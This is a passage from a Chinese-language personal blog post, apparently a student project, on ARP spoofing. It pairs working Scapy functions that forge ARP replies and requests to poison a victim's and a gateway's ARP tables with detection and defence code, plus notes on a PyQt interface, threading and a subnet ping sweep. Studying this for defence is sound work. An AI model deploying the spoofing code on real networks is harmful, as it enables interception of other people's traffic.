<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
<meta property="og:title" content="PIG-007">
<meta property="og:url" content="http://pig-007.github.io/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PIG-007">
<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/07/arp_spoof/">arp_spoof</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-03-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-07</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、原理"   >
          <a href="#一、原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、原理" class="headerlink" title="一、原理"></a>一、原理</h1>
      
        <h2 id="1-攻击"   >
          <a href="#1-攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-攻击" class="headerlink" title="1.攻击"></a>1.攻击</h2>
      
        <h3 id="1-欺骗受害者"   >
          <a href="#1-欺骗受害者" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-欺骗受害者" class="headerlink" title="(1)欺骗受害者"></a>(1)欺骗受害者</h3>
      <p>向受害者发包，欺骗受害者本机为网关，使得受害者的ARP表中本机的MAC地址为网关的MAC地址。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rep</span>(<span class="params">target_ip, gateway_ip</span>):</span></span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    <span class="comment">#print(gateway_ip)</span></span><br><span class="line">    <span class="keyword">if</span> target_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: Could not resolve targets MAC address&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=target_mac) / ARP(hwsrc=self_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip,</span><br><span class="line">                                                    op=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 本机mac 受欺骗的主机mac 本机mac 网关的ip地址 被攻击人的mac 被攻击人的ip OP值是表示请求还是回应 1：请求  2：回应</span></span><br><span class="line">        <span class="comment"># 那么这种模式下即本机发往受害者，告诉受害者网关(psrc)的mac地址是本机(self_mac)，下回依据IP查ARP表就会把应该发给网关的包通过mac发包发给本机</span></span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-欺骗网关"   >
          <a href="#2-欺骗网关" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-欺骗网关" class="headerlink" title="(2)欺骗网关"></a>(2)欺骗网关</h3>
      <p>向网关发包，欺骗网关受害者为本机，使得网关的ARP表中受害者的MAC地址为本机的MAC地址</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>(<span class="params">target_ip, gateway_ip</span>):</span></span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">    <span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: Could not resolve targets MAC address&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,</span><br><span class="line">                                                  op=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 本机mac 网关mac 本机mac 受欺骗的主机mac 网关mac 网关的ip地址 OP值是表示请求还是回应 1：请求  2：回应</span></span><br><span class="line">    <span class="comment"># 那么这种模式下即本机发往网关，告诉网关受害者(psrc)的mac地址是本机(self_mac)，下回依据IP查ARP表就会把应该发给受害者的包通过mac发包发给本机</span></span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-欺骗所有人"   >
          <a href="#3-欺骗所有人" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-欺骗所有人" class="headerlink" title="(3)欺骗所有人"></a>(3)欺骗所有人</h3>
      <p>向广播地址发包，使得所有人的ARP都被修改，从而欺骗所有人，这个没有实现，感觉动静太大，没啥用</p>

        <h2 id="2-防御"   >
          <a href="#2-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-防御" class="headerlink" title="2.防御"></a>2.防御</h2>
      
        <h3 id="1-检测"   >
          <a href="#1-检测" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-检测" class="headerlink" title="(1)检测"></a>(1)检测</h3>
      
        <h4 id="①rep模式"   >
          <a href="#①rep模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#①rep模式" class="headerlink" title="①rep模式"></a>①rep模式</h4>
      <p>这种模式本机的arp表中的MAC地址会改变，linux下由于输入arp加载比较慢，估计后台会进行ping，所以使用<code>ip neigh</code>来获取，从中找到是否存在相同的MAC地址，从而判断是否被该模式攻击，即转化为set看长度是否相同</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#detect_rep</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(ip_mac_dictionary) != <span class="built_in">len</span>(<span class="built_in">set</span>(ip_mac_dictionary.values()))):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rep_get&quot;</span>)</span><br><span class="line">    rep_detect_flag = <span class="literal">True</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="②req模式"   >
          <a href="#②req模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#②req模式" class="headerlink" title="②req模式"></a>②req模式</h4>
      <p>这种模式下我们可以尝试arping网关，如果MAC地址没被修改，而arping网关不能通，那么就是网关被欺骗，依据此来进行检测</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#detect_req</span></span><br><span class="line">gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">p = subprocess.Popen([<span class="string">&quot;arping&quot;</span>,<span class="string">&quot;-i&quot;</span>,netD_name,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;1&quot;</span>,gateway_mac], stdout=subprocess.PIPE)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> p.stdout.readlines():</span><br><span class="line">    line_splitby_space = line.decode(<span class="string">&quot;utf-8&quot;</span>).strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;Timeout&quot;</span> <span class="keyword">in</span> line_splitby_space):</span><br><span class="line">        req_detect_flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-实际防御"   >
          <a href="#2-实际防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-实际防御" class="headerlink" title="(2)实际防御"></a>(2)实际防御</h3>
      
        <h4 id="①rep模式-1"   >
          <a href="#①rep模式-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①rep模式-1" class="headerlink" title="①rep模式"></a>①rep模式</h4>
      <p>直接将网关真实的MAC地址和对应IP进行静态绑定即可。获取网关真实MAC地址，可以使用getmacbyip函数，该函数会向局域网内广播，询问网关真实的MAC的地址，而攻击者那里肯定存在真实的MAC地址，所以基本一定能获得到真实的IP地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071205089.png" alt="image-20220307120520964"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(rep_detect_flag):</span><br><span class="line">    self.ui.defenseInfoText.appendPlainText(<span class="string">&quot;Defending against arp_rep attacks......&quot;</span>)</span><br><span class="line">    build_rep_defense()</span><br><span class="line">    p = subprocess.Popen([<span class="string">&quot;ip&quot;</span>, <span class="string">&quot;neigh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> p.stdout.readlines():</span><br><span class="line">        line_splitby_space = line.decode(<span class="string">&quot;utf-8&quot;</span>).strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;FAILED&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> line_splitby_space):</span><br><span class="line">            self.ui.defenseInfoText.appendPlainText(<span class="string">&#x27;&#123;:&lt;30s&#125;&#x27;</span>.<span class="built_in">format</span>(line_splitby_space[<span class="number">0</span>]) + <span class="string">&quot;\t&quot;</span> + line_splitby_space[<span class="number">4</span>])</span><br></pre></td></tr></table></div></figure>

<p>这里我直接修改所有的的IP_MAC为静态的</p>

        <h4 id="②req模式-1"   >
          <a href="#②req模式-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#②req模式-1" class="headerlink" title="②req模式"></a>②req模式</h4>
      <p>由于是网关被欺骗了，所以我们也可以向网关发包，使其将我的IP和MAC真实写入ARP欺骗，但是攻击者可能会一直发包，所以我们也需要一直发包才能断续防御攻击，不过还是可能会丢不少包。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req_defense</span>():</span></span><br><span class="line">    <span class="keyword">global</span> gateway_ip</span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    self_ip = get_self_ip()</span><br><span class="line">    <span class="comment">#self_mac = get_if_hwaddr(netD_name)</span></span><br><span class="line">    gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">    <span class="comment">#Ether对应包的src和dst   ARP只会修改其中的ARP包，告诉dst，这个包的mac是hwsrc，ip是psrc，发给hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=self_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>

<p>如上设置包内容，告诉网关我才是真的。</p>
<p>或者有网关权限的，直接在网关的shell进行静态绑定。</p>

        <h1 id="二、pyQt界面"   >
          <a href="#二、pyQt界面" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、pyQt界面" class="headerlink" title="二、pyQt界面"></a>二、pyQt界面</h1>
      
        <h2 id="1-环境搭建"   >
          <a href="#1-环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h2>
      <p>主要配合pycharm，先安装pyQt5，然后在对应的包里即可打开</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install PyQt5</span><br><span class="line">/home/hacker/.<span class="built_in">local</span>/lib/python3.6/site-packages/qt5_applications/Qt/bin/designer</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-配合pycharm"   >
          <a href="#2-配合pycharm" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-配合pycharm" class="headerlink" title="2.配合pycharm"></a>2.配合pycharm</h2>
      <p>主要设置一下即可</p>
<p>File-&gt;setting-&gt;Tools-&gt;External Tools-&gt;+一下工具</p>

        <h3 id="Qt-Designer"   >
          <a href="#Qt-Designer" class="heading-link"><i class="fas fa-link"></i></a><a href="#Qt-Designer" class="headerlink" title="Qt_Designer"></a>Qt_Designer</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121488.png" alt="image-20220307112101403"></p>
<p>直接点击即可加载</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071125687.png" alt="image-20220307112540614"></p>

        <h3 id="UI转py"   >
          <a href="#UI转py" class="heading-link"><i class="fas fa-link"></i></a><a href="#UI转py" class="headerlink" title="UI转py"></a>UI转py</h3>
      <p>转完之后会比较舒服，因为在pycharm中可以提示相关的控件，但是直接load加载ui文件的话就没有提示。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121263.png" alt="image-20220307112150183"></p>
<p>Arguments的命令参数为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py</span><br></pre></td></tr></table></div></figure>

<p>目前好像py-&gt;ui没办法转回去</p>
<p>之后点击要转换的ui文件，然后对应的打开工具即可在当前文件夹下生成py文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071127006.png" alt="image-20220307112701929"></p>
<p>对应就会生成<code>window.py</code>文件</p>

        <h2 id="3-界面启动"   >
          <a href="#3-界面启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-界面启动" class="headerlink" title="3.界面启动"></a>3.界面启动</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainWindow</span>(<span class="params">QMainWindow</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="comment">#导入ui</span></span><br><span class="line">        self.ui = Ui_MainWindow()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication([])</span><br><span class="line">    myWindow = MainWindow()</span><br><span class="line">    myWindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-界面退出"   >
          <a href="#4-界面退出" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-界面退出" class="headerlink" title="4.界面退出"></a>4.界面退出</h2>
      <p>一般界面都是多线程的，所以退出的时候一般需要加上一些东西将一些线程给关闭，安全退出，所以需要重写一下窗口关闭的closeEvent函数</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">closeEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> threads_flag_dictionary.keys():</span><br><span class="line">        threads_flag_dictionary[key].<span class="built_in">set</span>()<span class="comment">#相关线程终止flag设置</span></span><br><span class="line">    event.accept()</span><br><span class="line">    os._exit(<span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>




        <h1 id="三、利用函数详解"   >
          <a href="#三、利用函数详解" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、利用函数详解" class="headerlink" title="三、利用函数详解"></a>三、利用函数详解</h1>
      
        <h2 id="1-发包函数"   >
          <a href="#1-发包函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-发包函数" class="headerlink" title="1.发包函数"></a>1.发包函数</h2>
      
        <h3 id="1-Ether"   >
          <a href="#1-Ether" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Ether" class="headerlink" title="(1)Ether"></a>(1)Ether</h3>
      <p>主要就是使用Ether创建一个MAC数据帧头，即源MAC地址，要发往的MAC地址，这个不能更改，用来在局域网中设置发往的地方。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ether(src=self_mac, dst=gateway_mac)</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-ARP"   >
          <a href="#2-ARP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ARP" class="headerlink" title="(2)ARP"></a>(2)ARP</h3>
      <p>这个就是用来伪造数据包中的ARP数据，可以随便改，目标主机接收到该数据包的时候，会判断是否和本机的ARP表是否相同，不同则会依据该ARP包来进行修改。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>

<p>ARP欺骗主要就是修改<code>hwsrc/psrc</code>，使得目标主机的ARP表依据该<code>hwsrc/psrc</code>来对自己的ARP表进行写入。比如这里就是使得目标主机中的ARP表由原本正确的<code>target_ip---target_MAC</code>变为<code>target_ip---self_mac</code></p>

        <h3 id="3-实际发包"   >
          <a href="#3-实际发包" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-实际发包" class="headerlink" title="(3)实际发包"></a>(3)实际发包</h3>
      <p>需要将Ether和ARP结合起来组成一个MAC帧pkt，然后就可以将该MAC帧发往网卡<code>network driver</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="①send"   >
          <a href="#①send" class="heading-link"><i class="fas fa-link"></i></a><a href="#①send" class="headerlink" title="①send"></a>①send</h4>
      <p>工作在第三层网络层，发送IP数据包，包头需要是IP数据包头</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.1.107&quot;</span>)/ICMP())</span><br></pre></td></tr></table></div></figure>


        <h4 id="②sendp"   >
          <a href="#②sendp" class="heading-link"><i class="fas fa-link"></i></a><a href="#②sendp" class="headerlink" title="②sendp"></a>②sendp</h4>
      <p>工作在第二层链路层，发送MAC帧，包头需要是MAC帧头，即Ether</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sendp(pkt, inter=<span class="number">2</span>, iface=netD_name)</span><br><span class="line"><span class="comment">#这里pkt就是包，即Ether()/ARP()之类的</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="2-线程函数"   >
          <a href="#2-线程函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-线程函数" class="headerlink" title="2.线程函数"></a>2.线程函数</h2>
      <p>使用pyQt线程函数，一般两种方法，比较喜欢用threading的</p>

        <h3 id="1-线程启动"   >
          <a href="#1-线程启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-线程启动" class="headerlink" title="(1)线程启动"></a>(1)线程启动</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置终止信号，防止线程一直运行不停止</span></span><br><span class="line">send_thread_defense_stop_flag = threading.Event()</span><br><span class="line"><span class="comment">#线程创建，对应self.send_pack函数，参数为args=(xxx,xxx,xxx)</span></span><br><span class="line">send_thread = threading.Thread(target=self.send_pack, args=(pkt,send_thread_defense_stop_flag,<span class="string">&quot;defense&quot;</span>))</span><br><span class="line"><span class="comment">#线程启动</span></span><br><span class="line">send_thread.start()</span><br><span class="line"><span class="comment">#将终止信号添加进字典进行管理</span></span><br><span class="line">threads_flag_dictionary[<span class="string">&#x27;send_defense_thread&#x27;</span>] = send_thread_defense_stop_flag</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-线程阻塞"   >
          <a href="#2-线程阻塞" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-线程阻塞" class="headerlink" title="(2)线程阻塞"></a>(2)线程阻塞</h3>
      <p>有时候需要线程阻塞，即完成该线程才进行下一步，那么就需要用到join函数</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用在send_thread.start()之后</span></span><br><span class="line">send_thread.join()</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-线程终止"   >
          <a href="#3-线程终止" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-线程终止" class="headerlink" title="(3)线程终止"></a>(3)线程终止</h3>
      <p>即之前提到的设置对应的终止flag</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#触发停止信号</span></span><br><span class="line">threads_flag_dictionary[<span class="string">&#x27;send_defense_thread&#x27;</span>].<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#send_pack函数中某些需要一直运行的代码块中</span></span><br><span class="line"><span class="keyword">while</span> (stop_flag.is_set()):</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="3-其他功能性函数"   >
          <a href="#3-其他功能性函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-其他功能性函数" class="headerlink" title="3.其他功能性函数"></a>3.其他功能性函数</h2>
      
        <h3 id="1-获取存活主机函数"   >
          <a href="#1-获取存活主机函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-获取存活主机函数" class="headerlink" title="(1)获取存活主机函数"></a>(1)获取存活主机函数</h3>
      <p>由于<code>ip neigh</code>命令会从一个存活主机的缓冲区中获取相关的主机，但是实际上如果新加入一个主机，则不会显示出来，除非接收到该主机的包，所以我们需要主动去ping他们，看他们是否存活。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ip_prefix = <span class="string">&#x27;.&#x27;</span>.join(gateway_ip.split(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    ip = <span class="string">&#x27;%s.%s&#x27;</span> % (ip_prefix, i)</span><br><span class="line">    threads.append(threading.Thread(target=ping_ip, args=&#123;ip, &#125;))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_ip</span>(<span class="params">ip_str</span>):</span></span><br><span class="line">    cmd = [<span class="string">&quot;ping&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;1&quot;</span>, ip_str]</span><br><span class="line">    output = os.popen(<span class="string">&quot; &quot;</span>.join(cmd)).readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> output:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(line).upper().find(<span class="string">&quot;TTL&quot;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ip: %s 在线&quot;</span> % ip_str)</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-获取本IP"   >
